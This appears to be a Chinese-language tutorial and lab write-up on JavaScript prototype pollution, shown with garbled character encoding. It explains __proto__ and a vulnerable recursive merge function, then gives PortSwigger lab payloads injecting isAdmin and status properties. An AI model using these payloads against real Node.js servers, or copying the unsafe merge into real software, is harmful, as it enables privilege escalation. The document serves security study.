åŸå‹é“¾æ±¡æŸ“åˆåˆ†ä¸ºå®¢æˆ·ç«¯åŸå‹é“¾æ±¡æŸ“å’ŒæœåŠ¡ç«¯åŸå‹é“¾æ±¡æŸ“ï¼›åœ¨ctfä¸­åŸºæœ¬éƒ½æ˜¯æœåŠ¡ç«¯æ±¡æŸ“å¯¼è‡´ç»•è¿‡éªŒè¯,å¾—åˆ°ç®¡ç†å‘˜æƒé™æˆ–è€…RCEç­‰ç­‰; JavaScript ä¸­çš„åŸå‹æ˜¯ä»€ä¹ˆï¼ŸJavaScript ä¸­çš„æ¯ä¸ªå¯¹è±¡éƒ½é“¾æ¥åˆ°æŸç§ç±»å‹çš„å¦ä¸€ä¸ªå¯¹è±¡ï¼Œç§°ä¸ºåŸå‹ã€‚JavaScript ä½¿ç”¨åŸå‹ç»§æ‰¿æ¨¡å‹ï¼Œè¿™ä¸è®¸å¤šå…¶ä»–è¯­è¨€ä½¿ç”¨çš„åŸºäºç±»çš„æ¨¡å‹æœ‰å¾ˆå¤§ä¸åŒã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒJavaScript ä¼šè‡ªåŠ¨å°†æ–°å¯¹è±¡åˆ†é…ç»™å…¶å†…ç½®åŸå‹ä¹‹ä¸€ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²ä¼šè‡ªåŠ¨åˆ†é…å†…ç½®çš„String.prototype. æ‚¨å¯ä»¥åœ¨ä¸‹é¢çœ‹åˆ°è¿™äº›å…¨å±€åŸå‹çš„æ›´å¤šç¤ºä¾‹ï¼š 1234567891011let myObject = {};Object.getPrototypeOf(myObject); // Object.prototypelet myString = &quot;&quot;;Object.getPrototypeOf(myString); // String.prototypelet myArray = [];Object.getPrototypeOf(myArray); // Array.prototypelet myNumber = 1;Object.getPrototypeOf(myNumber); // Number.prototype å¯¹è±¡ä¼šè‡ªåŠ¨ç»§æ‰¿å…¶æŒ‡å®šåŸå‹çš„æ‰€æœ‰å±æ€§ï¼Œé™¤éå®ƒä»¬å·²ç»æ‹¥æœ‰å…·æœ‰ç›¸åŒé”®çš„è‡ªå·±çš„å±æ€§ã€‚è¿™ä½¿å¾—å¼€å‘äººå‘˜èƒ½å¤Ÿåˆ›å»ºå¯ä»¥é‡ç”¨ç°æœ‰å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•çš„æ–°å¯¹è±¡ã€‚ å†…ç½®åŸå‹æä¾›äº†ç”¨äºå¤„ç†åŸºæœ¬æ•°æ®ç±»å‹çš„æœ‰ç”¨å±æ€§å’Œæ–¹æ³•ã€‚ä¾‹å¦‚ï¼ŒString.prototypeå¯¹è±¡æœ‰ä¸€ä¸ªtoLowerCase()æ–¹æ³•ã€‚å› æ­¤ï¼Œæ‰€æœ‰å­—ç¬¦ä¸²éƒ½ä¼šè‡ªåŠ¨æœ‰ä¸€ä¸ªç°æˆçš„æ–¹æ³•å°†å®ƒä»¬è½¬æ¢ä¸ºå°å†™ã€‚è¿™ä½¿å¾—å¼€å‘äººå‘˜ä¸å¿…æ‰‹åŠ¨å°†æ­¤è¡Œä¸ºæ·»åŠ åˆ°ä»–ä»¬åˆ›å»ºçš„æ¯ä¸ªæ–°å­—ç¬¦ä¸²ä¸­ã€‚ å¯¹è±¡ç»§æ‰¿æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿæ¯å½“æ‚¨å¼•ç”¨å¯¹è±¡çš„å±æ€§æ—¶ï¼ŒJavaScript å¼•æ“éƒ½ä¼šé¦–å…ˆå°è¯•ç›´æ¥åœ¨å¯¹è±¡æœ¬èº«ä¸Šè®¿é—®è¯¥å±æ€§ã€‚å¦‚æœå¯¹è±¡æ²¡æœ‰åŒ¹é…çš„å±æ€§ï¼ŒJavaScript å¼•æ“ä¼šåœ¨å¯¹è±¡çš„åŸå‹ä¸ŠæŸ¥æ‰¾å®ƒã€‚ åŸå‹é“¾è¯·æ³¨æ„ï¼Œä¸€ä¸ªå¯¹è±¡çš„åŸå‹åªæ˜¯å¦ä¸€ä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¹Ÿåº”è¯¥æœ‰è‡ªå·±çš„åŸå‹ï¼Œä¾æ­¤ç±»æ¨ã€‚ç”±äºå®é™…ä¸Š JavaScript ä¸­çš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯åº•å±‚çš„å¯¹è±¡ï¼Œå› æ­¤è¿™æ¡é“¾æœ€ç»ˆä¼šå›åˆ°é¡¶å±‚Object.prototypeï¼Œå…¶åŸå‹å¾ˆç®€å•nullã€‚ è‡³å…³é‡è¦çš„æ˜¯ï¼Œå¯¹è±¡ä¸ä»…ä»å…¶ç›´æ¥åŸå‹ç»§æ‰¿å±æ€§ï¼Œè€Œä¸”ä»åŸå‹é“¾ä¸­ä½äºå…¶ä¸Šæ–¹çš„æ‰€æœ‰å¯¹è±¡ç»§æ‰¿å±æ€§ã€‚åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œè¿™æ„å‘³ç€usernameå¯¹è±¡å¯ä»¥è®¿é—®Stringçš„å±æ€§å’Œæ–¹æ³•ã€‚String.prototype and Object.prototype. ä½¿ç”¨ __proto__ è®¿é—®å¯¹è±¡çš„åŸå‹æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªç‰¹æ®Šçš„å±æ€§ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥è®¿é—®å…¶åŸå‹ã€‚å°½ç®¡å®ƒæ²¡æœ‰æ­£å¼çš„æ ‡å‡†åŒ–åç§°ï¼Œä½†__proto__å®ƒæ˜¯å¤§å¤šæ•°æµè§ˆå™¨ä½¿ç”¨çš„äº‹å®ä¸Šçš„æ ‡å‡†ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥è¯»å–åŸå‹åŠå…¶å±æ€§ï¼Œç”šè‡³åœ¨å¿…è¦æ—¶é‡æ–°åˆ†é…å®ƒä»¬ã€‚ ä¸ä»»ä½•å±æ€§ä¸€æ ·ï¼Œæ‚¨å¯ä»¥__proto__ä½¿ç”¨æ‹¬å·æˆ–ç‚¹ç¬¦å·è¿›è¡Œè®¿é—®ï¼š 12username.__proto__username['__proto__'] ç”šè‡³å¯ä»¥é“¾æ¥å¼•ç”¨ä»¥__proto__æ²¿ç€åŸå‹é“¾å‘ä¸Šå·¥ä½œï¼š 123username.__proto__ // String.prototypeusername.__proto__.__proto__ // Object.prototypeusername.__proto__.__proto__.__proto__ // null ä¿®æ”¹åŸå‹ä¿®æ”¹åŸå‹å¯ä»¥åƒä¿®æ”¹ä»»ä½•å…¶ä»–å¯¹è±¡ä¸€æ ·ä¿®æ”¹ JavaScript çš„å†…ç½®åŸå‹ã€‚è¿™æ„å‘³ç€å¼€å‘äººå‘˜å¯ä»¥è‡ªå®šä¹‰æˆ–é‡å†™å†…ç½®æ–¹æ³•çš„è¡Œä¸ºï¼Œç”šè‡³æ·»åŠ æ–°æ–¹æ³•æ¥æ‰§è¡Œæœ‰ç”¨çš„æ“ä½œã€‚ ä¾‹å¦‚ï¼Œç°ä»£ JavaScript æä¾›äº†trim()å­—ç¬¦ä¸²æ–¹æ³•ï¼Œä½¿æ‚¨èƒ½å¤Ÿè½»æ¾åˆ é™¤ä»»ä½•å‰å¯¼æˆ–å°¾éšç©ºæ ¼ã€‚åœ¨å¼•å…¥æ­¤å†…ç½®æ–¹æ³•ä¹‹å‰ï¼Œå¼€å‘äººå‘˜æœ‰æ—¶ä¼šString.prototypeé€šè¿‡æ‰§è¡Œä»¥ä¸‹æ“ä½œå°†è‡ªå·±çš„æ­¤è¡Œä¸ºçš„è‡ªå®šä¹‰å®ç°æ·»åŠ åˆ°å¯¹è±¡ä¸­ï¼š 1String.prototype.removeWhitespace = function(){ // remove leading and trailing whitespace } ç”±äºåŸå‹ç»§æ‰¿ï¼Œæ‰€æœ‰å­—ç¬¦ä¸²éƒ½å¯ä»¥è®¿é—®æ­¤æ–¹æ³•ï¼š 1let searchTerm = &quot; example &quot;; searchTerm.removeWhitespace(); // &quot;example&quot; åŸå‹æ±¡æŸ“æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿå½“JavaScriptå‡½æ•°é€’å½’åœ°å°†åŒ…å«ç”¨æˆ·å¯æ§å±æ€§çš„å¯¹è±¡åˆå¹¶åˆ°ç°æœ‰å¯¹è±¡æ—¶ï¼Œé€šå¸¸ä¼šå‡ºç°åŸå‹æ±¡æŸ“æ¼æ´ã€‚è¿™å¯ä»¥å…è®¸æ”»å‡»è€…æ³¨å…¥å¸¦æœ‰ç±»ä¼¼__proto__çš„é”®çš„å±æ€§ï¼Œä»¥åŠä»»æ„åµŒå¥—çš„å±æ€§ã€‚ ç”±äº__proto__åœ¨JavaScriptä¸Šä¸‹æ–‡ä¸­çš„ç‰¹æ®Šå«ä¹‰ï¼Œåˆå¹¶æ“ä½œå¯èƒ½ä¼šå°†åµŒå¥—å±æ€§åˆ†é…ç»™å¯¹è±¡çš„åŸå‹ï¼Œè€Œä¸æ˜¯ç›®æ ‡å¯¹è±¡æœ¬èº«ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥ç”¨åŒ…å«æ¶æ„å€¼çš„å±æ€§æ±¡æŸ“åŸå‹ï¼Œè¿™äº›å±æ€§éšåå¯èƒ½è¢«åº”ç”¨ç¨‹åºä»¥å±é™©çš„æ–¹å¼ä½¿ç”¨ã€‚ æ›´å¤šå‚è€ƒ prototype , __proto__prototype å’Œ __proto__ æ˜¯ JavaScript ä¸­ä¸åŸå‹ï¼ˆprototypeï¼‰ç›¸å…³çš„ä¸¤ä¸ªé‡è¦æ¦‚å¿µï¼Œä½†å®ƒä»¬æœ‰ä¸åŒçš„ç”¨é€”å’Œå«ä¹‰ã€‚ prototype: prototype æ˜¯å‡½æ•°å¯¹è±¡ç‰¹æœ‰çš„å±æ€§ã€‚æ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ª prototype å±æ€§ï¼Œè¿™ä¸ªprototypeå±æ€§æ˜¯ä¸€ä¸ªæŒ‡å‘åŸå‹å¯¹è±¡çš„æŒ‡é’ˆï¼Œå®ƒåŒ…å«äº†å¯ä»¥ç”±è¯¥å‡½æ•°çš„å®ä¾‹ç»§æ‰¿çš„å±æ€§å’Œæ–¹æ³•ã€‚ å½“ä½ åˆ›å»ºä¸€ä¸ªæ–°çš„å‡½æ•°æ—¶ï¼ŒJavaScript è‡ªåŠ¨ä¸ºè¯¥å‡½æ•°åˆ›å»ºä¸€ä¸ª prototype å¯¹è±¡ï¼Œå¹¶èµ‹å€¼ç»™ prototype å±æ€§ã€‚ é€šè¿‡ prototype å¯¹è±¡ï¼Œä½ å¯ä»¥å®šä¹‰å‡½æ•°çš„å…±äº«å±æ€§å’Œæ–¹æ³•ï¼Œå®ƒå°†è¢«è¯¥å‡½æ•°çš„æ‰€æœ‰å®ä¾‹æ‰€å…±äº«ã€‚ 12345678910111213141516171819// å®šä¹‰æ„é€ å‡½æ•°function Person(name, age) { // å®ä¾‹å±æ€§ this.name = name; this.age = age; } // åœ¨æ„é€ å‡½æ•°çš„ prototype ä¸Šå®šä¹‰å…±äº«æ–¹æ³• Person.prototype.sayHello = function() { console.log(`Hello, my name is ${this.name} and I am ${this.age} years old.`); }; // åˆ›å»ºå®ä¾‹ const person1 = new Person(&quot;Alice&quot;, 25); const person2 = new Person(&quot;Bob&quot;, 30); // è°ƒç”¨å…±äº«æ–¹æ³• person1.sayHello(); // è¾“å‡º: Hello, my name is Alice and I am 25 years old. person2.sayHello(); // è¾“å‡º: Hello, my name is Bob and I am 30 years old. proto: __proto__ æ˜¯æ¯ä¸ªå¯¹è±¡éƒ½å…·æœ‰çš„å±æ€§ï¼Œç”¨äºæŒ‡å‘å…¶æ„é€ å‡½æ•°çš„åŸå‹ã€‚å®ƒæ˜¯ä¸€ä¸ªæŒ‡å‘è¯¥å¯¹è±¡çš„åŸå‹é“¾ä¸Šä¸€å±‚çš„é“¾æ¥ã€‚ __proto__ å±æ€§æ˜¯éæ ‡å‡†çš„ï¼Œå°½ç®¡å¤§å¤šæ•°ç°ä»£æµè§ˆå™¨éƒ½æ”¯æŒå®ƒï¼Œä½†å®ƒå·²ç»è¢« ECMAScript 6 æ ‡å‡†ä¸­çš„ Object.getPrototypeOf æ–¹æ³•æ‰€æ›¿ä»£ã€‚ __proto__ ä¸»è¦ç”¨äºè·å–å’Œè®¾ç½®å¯¹è±¡çš„åŸå‹ã€‚ 12345678910111213141516171819202122232425const myObject= {};const myObjectPrototype = Object.getPrototypeOf(myObject);console.log(myObjectPrototype === Object.prototype); //trueconsole.log(myObject.__proto__ === Object.prototype); //trueconst myString = &quot;&quot;;const myStringPrototype = Object.getPrototypeOf(myString);console.log(myStringPrototype.__proto__ === Object.prototype); //trueconst myArray = [];const myArrayPrototype = Object.getPrototypeOf(myArray);console.log(myArrayPrototype.__proto__ === Object.prototype); //trueconst myNumber = 1;const myNumberPrototype = Object.getPrototypeOf(myNumber);console.log(myNumberPrototype.__proto__ === Object.prototype); //true//======================================================================console.log(Object.getPrototypeOf(myString)) //{}console.log(Object.getPrototypeOf(myNumber)) //{}console.log(Object.getPrototypeOf(myString) ==Object.getPrototypeOf(myNumber)) //falseconsole.log(Object.getPrototypeOf(myString).__proto__ ==Object.getPrototypeOf(myNumber).__proto__) //true//ä¸‹é¢è§£é‡Šä¸ºä»€ä¹ˆæ˜¯ false?//åœ¨ JavaScript ä¸­ï¼ŒObject.getPrototypeOf ç”¨äºè·å–å¯¹è±¡çš„åŸå‹ã€‚åœ¨ä»£ç ä¸­ï¼ŒmyString æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œè€Œ myNumber æ˜¯ä¸€ä¸ªæ•°å­—ã€‚å½“è°ƒç”¨ Object.getPrototypeOf(myString) æ—¶ï¼Œå®ƒè¿”å›çš„æ˜¯å­—ç¬¦ä¸²çš„åŸå‹å¯¹è±¡ String.prototypeã€‚åŒæ ·ï¼ŒObject.getPrototypeOf(myNumber) è¿”å›çš„æ˜¯æ•°å­—çš„åŸå‹å¯¹è±¡ Number.prototypeã€‚è™½ç„¶è¾“å‡ºç»“æœéƒ½æ˜¯ {} å¯¹è±¡ï¼Œä½†å®ƒä»¬æ˜¯ä¸åŒçš„å¯¹è±¡ã€‚è¿™æ˜¯å› ä¸º {} æ˜¯è¡¨ç¤ºä¸€ä¸ªç©ºå¯¹è±¡å­—é¢é‡çš„æ–¹å¼ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„ç©ºå¯¹è±¡ã€‚åœ¨ JavaScript ä¸­ï¼Œæ¯æ¬¡è°ƒç”¨ Object.getPrototypeOf éƒ½ä¼šè¿”å›ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œå³ä½¿å®ƒä»¬æœ‰ç€ç›¸åŒçš„ç»“æ„å’ŒåŸå‹é“¾ã€‚ æ€»çš„æ¥è¯´ï¼Œprototype ç”¨äºæ„é€ å‡½æ•°ï¼Œå¸®åŠ©å®šä¹‰å…±äº«å±æ€§å’Œæ–¹æ³•ï¼Œè€Œ __proto__ æ˜¯æ¯ä¸ªå¯¹è±¡éƒ½æœ‰çš„å±æ€§ï¼Œç”¨äºæŒ‡å‘å…¶æ„é€ å‡½æ•°çš„åŸå‹ã€‚Object.getPrototypeOf æ–¹æ³•æ˜¯æ›´æ¨èä½¿ç”¨çš„è·å–åŸå‹çš„æ–¹å¼ï¼Œè€Œ __proto__ åœ¨ç°ä»£ JavaScript ä¸­å·²ç»ä¸å†å»ºè®®ä½¿ç”¨ã€‚ ä¸€ä¸ªç®€å•çš„æ¡ˆä¾‹ 1234567891011121314const myObject = { a: 1, b: 2 };Object.prototype.c = 3;myObject.__proto__.d = 4;for(const propertyKey in myObject){ console.log(propertyKey);}//è¾“å‡ºï¼š//a//b//c//d è¿™ä¹Ÿé€‚ç”¨äºæ•°ç»„ï¼Œå…¶ä¸­for...inå¾ªç¯é¦–å…ˆè¿­ä»£æ¯ä¸ªç´¢å¼•ï¼ˆæœ¬è´¨ä¸Šåªæ˜¯åº•å±‚çš„æ•°å­—å±æ€§é”®ï¼‰ï¼Œç„¶åå†ç»§ç»­å¤„ç†ä»»ä½•ç»§æ‰¿çš„å±æ€§ã€‚ 1234567891011121314151617const myArray = ['a','b'];Object.prototype.c = 3;myArray.__proto__.d = 4;for(const arrayKey in myArray){ console.log(arrayKey);}//è¾“å‡º//0//1//d//c//ä¸‹é¢è§£é‡Šä¸ºä»€ä¹ˆé”®â€œcâ€è¾“å‡ºåœ¨â€œdâ€çš„åé¢ï¼Ÿ//åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç»™ Object.prototype æ·»åŠ äº†ä¸€ä¸ªå±æ€§ cï¼Œå¹¶ç»™ myArray.__proto__ æ·»åŠ äº†ä¸€ä¸ªå±æ€§ dã€‚å½“æ‚¨ä½¿ç”¨ for...in å¾ªç¯è¿­ä»£æ•°ç»„æ—¶ï¼Œå®ƒä¼šéå†å¯¹è±¡çš„æ‰€æœ‰å¯æšä¸¾å±æ€§ï¼ŒåŒ…æ‹¬åŸå‹é“¾ä¸Šçš„å±æ€§ã€‚åœ¨JavaScriptä¸­ï¼ŒObject.prototype æ˜¯æ‰€æœ‰å¯¹è±¡çš„åŸå‹é“¾çš„é¡¶éƒ¨ï¼Œå› æ­¤å®ƒçš„å±æ€§ä¼šåœ¨å…¶ä»–åŸå‹ä¸Šçš„å±æ€§ä¹‹å‰è¢«éå†ã€‚åœ¨è¿™é‡Œï¼Œc æ˜¯æ·»åŠ åˆ°æ‰€æœ‰å¯¹è±¡çš„åŸå‹é“¾ä¸Šçš„å±æ€§ï¼Œè€Œ d æ˜¯æ·»åŠ åˆ° myArray.__proto__ ä¸Šçš„å±æ€§ã€‚å› æ­¤ï¼Œåœ¨ for...in å¾ªç¯ä¸­ï¼Œd çš„è¾“å‡ºåœ¨ c ä¹‹å‰ï¼Œå› ä¸º myArray.__proto__ çš„å±æ€§ä¼šå…ˆè¢«éå†ã€‚ é€šè¿‡ JSON è¾“å…¥é€ æˆåŸå‹æ±¡æŸ“JSON.parse()åœ¨ctfä¸­æœ€å¸¸è§çš„è«è¿‡äºJSON.parse()å‡½æ•°äº†ï¼› ç”¨æˆ·å¯æ§çš„å¯¹è±¡é€šå¸¸æ˜¯ä½¿ç”¨è¯¥JSON.parse()æ–¹æ³•ä» JSON å­—ç¬¦ä¸²æ´¾ç”Ÿçš„ã€‚æœ‰è¶£çš„æ˜¯ï¼ŒJSON.parse()è¿˜å°† JSON å¯¹è±¡ä¸­çš„ä»»ä½•é”®è§†ä¸ºä»»æ„å­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬__proto__. è¿™ä¸ºåŸå‹æ±¡æŸ“æä¾›äº†å¦ä¸€ä¸ªæ½œåœ¨è½½ä½“ã€‚ å‡è®¾æ”»å‡»è€…é€šè¿‡ç½‘ç»œæ¶ˆæ¯æ³¨å…¥ä»¥ä¸‹æ¶æ„ JSONï¼š 12345{ &quot;__proto__&quot;: { &quot;evilProperty&quot;: &quot;payload&quot; }} å¦‚æœé€šè¿‡è¯¥æ–¹æ³•å°†å…¶è½¬æ¢ä¸º JavaScript å¯¹è±¡JSON.parse()ï¼Œåˆ™ç”Ÿæˆçš„å¯¹è±¡å®é™…ä¸Šå°†å…·æœ‰ä¸€ä¸ªå¸¦æœ‰ key çš„å±æ€§__proto__ï¼š 12345const objectLiteral = {__proto__: {evilProperty: 'payload'}};const objectFromJson = JSON.parse('{&quot;__proto__&quot;: {&quot;evilProperty&quot;: &quot;payload&quot;}}');console.log(objectLiteral.hasOwnProperty('__proto__')); // falseconsole.log(objectFromJson.hasOwnProperty('__proto__')); // true æ³¨æ„ï¼šåœ¨Node.jsä¸­ï¼ŒhasOwnPropertyå‡½æ•°æ˜¯JavaScriptä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥å¯¹è±¡è‡ªèº«æ˜¯å¦åŒ…å«æŒ‡å®šçš„å±æ€§ï¼ˆå³ä¸åŒ…æ‹¬ä»åŸå‹é“¾ç»§æ‰¿çš„å±æ€§ï¼‰ã€‚è¿™ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œå¦‚æœå¯¹è±¡åŒ…å«æŒ‡å®šçš„å±æ€§ï¼Œåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚ ä¾‹å¦‚ï¼š 1234let obj = {a: 1, b: 2};console.log(obj.hasOwnProperty('a')); // trueconsole.log(obj.hasOwnProperty('c')); // false Example12345678910111213141516171819202122232425262728293031323334353637function merge(target, source) { for (let key in source) { if (key in source &amp;&amp; key in target) { // console.log(key) // console.log(target[key]) // console.log(source[key]) merge(target[key], source[key]) } else { target[key] = source[key] } }}let object1 = {}let object2 = JSON.parse('{&quot;a&quot;: 1, &quot;__proto__&quot;: {&quot;b&quot;: 2}}')merge(object1, object2)console.log(object1.a, object1.b) //1 2object3 = {}console.log(object3.b) //2let object4 = &quot;&quot;console.log(object4.b) //2// console.log(object2.hasOwnProperty('a'));// console.log(object2.hasOwnProperty('b'));// console.log(object2.hasOwnProperty('__proto__'));// console.log(object1.__proto__);// console.log(object2.__proto__);// console.log(object3.__proto__);//æˆ‘å°†å¤§è‡´è§£é‡Šä¸€ä¸‹è¿™æ®µä»£ç æ˜¯å¦‚ä½•é€šè¿‡mergeå‡½æ•°æ±¡æŸ“åˆ°object3çš„å±æ€§çš„(è¿™æ ·è¯´ä¹Ÿè®¸ä¸å¤ªå¯¹ï¼Œåº”è¯¥æ˜¯æ±¡æŸ“åˆ°äº†åŸå‹çš„å±æ€§ï¼Œæ‰€ä»¥æ–°å»ºä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§)//JSON.parseåœ¨ä¸Šé¢å·²ç»åˆ†æè¿‡äº†ï¼›è¿™é‡Œä¸»è¦çœ‹mergeå‡½æ•°ï¼›//ç¬¬ä¸€æ¬¡å¾ªç¯:&quot;a&quot;: 1//å•çº¯çš„å°†object2çš„aå±æ€§èµ‹å€¼ç»™object1//ç¬¬äºŒæ¬¡å¾ªç¯:&quot;__proto__&quot;: {&quot;b&quot;: 2}//é¦–å…ˆå°†__proto__èµ‹å€¼ç»™key;//if (key in source &amp;&amp; key in target)åˆ¤æ–­ä¸ºçœŸï¼Œå› ä¸ºtargetä¹Ÿå°±æ˜¯object2æœ‰__proto__å±æ€§ï¼Œè¿™ä¸€ç‚¹å¯ä»¥ç”¨hasOwnPropertyå‡½æ•°æ›´èƒ½çœ‹æ˜ç™½//å¦‚æœåˆ¤æ–­ä¸ºçœŸï¼Œé€’å½’mergeå‡½æ•°ï¼Œè¿™é‡Œæ³¨æ„ ä¼ é€’çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯object1.__proto__å’Œç¬¬äºŒä¸ªå‚æ•°object2.__proto__ == ({&quot;b&quot;: 2})//æ¥ç€ä¼šå‘object1.__proto__èµ‹å€¼bå±æ€§ï¼Œè€Œobject1.__proto__å°±æ˜¯åŸå‹ï¼Œæ‰€ä»¥æ•´ä¸ªåŸå‹æ±¡æŸ“æµç¨‹ç»“æŸ æœåŠ¡å™¨ç«¯åŸå‹æ±¡æŸ“è®°å½•ä¸€ä¸‹portswiggerä¸Šçš„å®éªŒï¼›æ¼æ´ç‚¹éƒ½æ˜¯åœ¨ä¸€ä¸ªä¿®æ”¹ä¸ªäººå½¢è±¡çš„åŠŸèƒ½ç‚¹ï¼Œåç«¯æ˜¯åŸºäº Node.js å’Œ Express æ¡†æ¶æ„å»ºã€‚å®ƒå¾ˆå®¹æ˜“å—åˆ°æœåŠ¡å™¨ç«¯åŸå‹æ±¡æŸ“çš„å½±å“ï¼Œå› ä¸ºå®ƒå°†ç”¨æˆ·å¯æ§çš„è¾“å…¥ä¸å®‰å…¨åœ°åˆå¹¶åˆ°æœåŠ¡å™¨ç«¯ JavaScript å¯¹è±¡ä¸­ã€‚ æ±¡æŸ“è¿›è¡Œæƒé™å‡çº§ç”¨bpæŠ“åŒ…;å¾€è¯·æ±‚åŒ…ä¸­ç”¨__proto__å°è¯•åŸå‹æ±¡æŸ“ï¼›ç„¶åå‘é€è¯·æ±‚ã€‚å¯ä»¥çœ‹åˆ°å“åº”åŒ…ä¸­å‡ºç°äº†&quot;hacker&quot;:&quot;zIxyd&quot; 1&quot;__proto__&quot;:{&quot;hacker&quot;:&quot;zIxyd&quot;} ç¡®è®¤å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œå‘é€æ¶æ„æ•°æ®ï¼Œ 1&quot;__proto__&quot;:{&quot;isAdmin&quot;:true} æ£€æµ‹æœåŠ¡å™¨ç«¯åŸå‹æ±¡æŸ“å¤§å¤šæ•°æ—¶å€™ï¼Œå³ä½¿æ‚¨æˆåŠŸæ±¡æŸ“äº†æœåŠ¡å™¨ç«¯åŸå‹å¯¹è±¡ï¼Œæ‚¨ä¹Ÿä¸ä¼šåœ¨å“åº”ä¸­çœ‹åˆ°å—å½±å“çš„å±æ€§ã€‚ä¹Ÿå°±æ˜¯è¯´ä½ åœ¨ä¸€ä¸ªç‚¹ä¸Šæ— æ³•åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸå‹æ±¡æŸ“ï¼›é‚£è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ ä¸€ç§æ–¹æ³•æ˜¯å°è¯•æ³¨å…¥ä¸æœåŠ¡å™¨çš„æ½œåœ¨é…ç½®é€‰é¡¹ç›¸åŒ¹é…çš„å±æ€§ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥æ¯”è¾ƒæ³¨å…¥å‰åæœåŠ¡å™¨çš„è¡Œä¸ºï¼Œä»¥æŸ¥çœ‹æ­¤é…ç½®æ›´æ”¹æ˜¯å¦å·²ç”Ÿæ•ˆã€‚å¦‚æœæ˜¯è¿™æ ·ï¼Œè¿™å¼ºçƒˆè¡¨æ˜æ‚¨å·²æˆåŠŸå‘ç°æœåŠ¡å™¨ç«¯åŸå‹æ±¡æŸ“æ¼æ´ã€‚ çŠ¶æ€ç è¦†ç›–Express ç­‰æœåŠ¡å™¨ç«¯ JavaScript æ¡†æ¶å…è®¸å¼€å‘äººå‘˜è®¾ç½®è‡ªå®šä¹‰ HTTP å“åº”çŠ¶æ€ã€‚å¦‚æœå‡ºç°é”™è¯¯ï¼ŒJavaScript æœåŠ¡å™¨å¯èƒ½ä¼šå‘å‡ºé€šç”¨ HTTP å“åº”ï¼Œä½†åœ¨æ­£æ–‡ä¸­åŒ…å« JSON æ ¼å¼çš„é”™è¯¯å¯¹è±¡ã€‚è¿™æ˜¯æä¾›æœ‰å…³é”™è¯¯å‘ç”ŸåŸå› çš„é™„åŠ è¯¦ç»†ä¿¡æ¯çš„ä¸€ç§æ–¹æ³•ï¼Œè¿™ä»é»˜è®¤ HTTP çŠ¶æ€ä¸­å¯èƒ½å¹¶ä¸æ˜æ˜¾ã€‚ Node çš„http-errorsæ¨¡å—åŒ…å«ä»¥ä¸‹ç”¨äºç”Ÿæˆæ­¤ç±»é”™è¯¯å“åº”çš„å‡½æ•°ï¼š 12345678910111213function createError () { //... if (type === 'object' &amp;&amp; arg instanceof Error) { err = arg //æ³¨æ„ä¸‹é¢è¿™ä¸€è¡Œ status = err.status || err.statusCode || status } else if (type === 'number' &amp;&amp; i === 0) { //... if (typeof status !== 'number' || (!statuses.message[status] &amp;&amp; (status &gt; 400 || status &gt;= 600))) { status = 500 } //... â€œ //æ³¨æ„ä¸‹é¢è¿™ä¸€è¡Œâ€æ˜¾ç¤ºçš„ä¸‹ä¸€è¡Œè¯•å›¾é€šè¿‡è¯»å–ä¼ é€’ç»™å‡½æ•°çš„å¯¹è±¡çš„statusæˆ–statusCodeå±æ€§æ¥åˆ†é…çŠ¶æ€å˜é‡ã€‚å¦‚æœç½‘ç«™çš„å¼€å‘äººå‘˜æ²¡æœ‰æ˜ç¡®åœ°ä¸ºé”™è¯¯è®¾ç½®çŠ¶æ€å±æ€§ï¼Œä½ å¯ä»¥ä½¿ç”¨å®ƒæ¥æ¢æµ‹åŸå‹æ±¡æŸ“ï¼› æ³¨æ„ï¼šæ ¹æ®ä»£ç åˆ†æï¼Œæˆ‘ä»¬è¦ä¿®æ”¹çš„çŠ¶æ€ç å¿…é¡»åœ¨400å’Œ600ä¹‹é—´ï¼Œå¦åˆ™ä¸ºçŠ¶æ€ç ä¸º500 å†æ¬¡å£°æ˜ï¼Œå®éªŒç¯å¢ƒç”¨çš„æ˜¯ï¼športswigger å¤šåŠ äº†ä¸€ä¸ªåŒå¼•å·ï¼Œä½¿å¾—jsonæ ¼å¼ä¸å¯¹ï¼Œè¿”å›æŠ¥é”™çŠ¶æ€ç ä¸º400 å°è¯•æ±¡æŸ“statusçš„å€¼ 123&quot;__proto__&quot;: { &quot;status&quot;:555} å†æ¬¡ä½¿å¾—jsonæ ¼å¼é”™ä¹±ï¼ŒæŸ¥çœ‹æŠ¥é”™çŠ¶æ€ç ä¸º555,è¯´æ˜å·²ç»æ±¡æŸ“æˆåŠŸäº† JSON ç©ºæ ¼è¦†ç›–Express æ¡†æ¶æä¾›äº†ä¸€ä¸ªjson spacesé€‰é¡¹ï¼Œä½¿æ‚¨èƒ½å¤Ÿé…ç½®ç”¨äºç¼©è¿›å“åº”ä¸­ä»»ä½• JSON æ•°æ®çš„ç©ºæ 